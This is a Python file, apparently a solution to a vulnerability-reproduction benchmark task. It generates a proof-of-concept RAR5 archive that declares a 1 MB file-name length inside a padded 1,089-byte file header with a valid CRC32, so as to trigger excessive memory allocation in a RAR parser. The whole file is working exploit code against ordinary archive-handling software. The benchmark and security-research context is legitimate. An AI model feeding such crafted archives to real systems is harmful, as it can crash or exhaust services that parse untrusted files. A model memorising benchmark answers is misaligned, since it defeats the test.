import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """

        def encode_vint(value: int) -> bytes:
            """Encodes an integer into the RAR5 variable-length integer format."""
            if value == 0:
                return b'\x00'
            encoded = bytearray()
            while value > 0:
                byte = value & 0x7f
                value >>= 7
                if value > 0:
                    byte |= 0x80
                encoded.append(byte)
            return bytes(encoded)

        # RAR5 file signature
        signature = b'Rar!\x1a\x07\x01\x00'

        # Block Type: 0x02 (File Header)
        vint_block_type = encode_vint(2)

        # Block Flags: 0
        vint_block_flags = encode_vint(0)

        # File-specific fields
        vint_file_flags = encode_vint(0)
        vint_unpacked_size = encode_vint(0)
        vint_file_attributes = encode_vint(0)
        vint_compression_info = encode_vint(0)
        vint_host_os = encode_vint(0)

        # Malicious File Name Length: a large value to trigger excessive allocation.
        # 1MB is sufficient.
        file_name_len = 0x100000
        vint_file_name_len = encode_vint(file_name_len)

        target_poc_len = 1089
        
        # The length of a RAR5 block size vint can vary. For a PoC of this size,
        # it is 2 bytes. We hardcode this assumption to calculate padding.
        assumed_vint_block_size_len = 2

        # Calculate size of all non-name-data fields to determine padding length
        fixed_fields_size = (
            len(signature) +
            4 +  # CRC32
            assumed_vint_block_size_len +
            len(vint_block_type) +
            len(vint_block_flags) +
            len(vint_file_flags) +
            len(vint_unpacked_size) +
            len(vint_file_attributes) +
            len(vint_compression_info) +
            len(vint_host_os) +
            len(vint_file_name_len)
        )
        
        name_padding_len = target_poc_len - fixed_fields_size
        file_name_data = b'A' * name_padding_len

        block_data = (
            vint_file_flags +
            vint_unpacked_size +
            vint_file_attributes +
            vint_compression_info +
            vint_host_os +
            vint_file_name_len +
            file_name_data
        )
        
        # The block content is the part over which the CRC is calculated
        block_content = vint_block_type + vint_block_flags + block_data
        
        block_size = len(block_content)
        vint_block_size = encode_vint(block_size)
        
        # This PoC's correctness depends on the block size vint being 2 bytes.
        assert len(vint_block_size) == assumed_vint_block_size_len

        crc = zlib.crc32(block_content)
        crc_bytes = crc.to_bytes(4, 'little')

        poc = (
            signature +
            crc_bytes +
            vint_block_size +
            block_content
        )
        
        assert len(poc) == target_poc_len
            
        return poc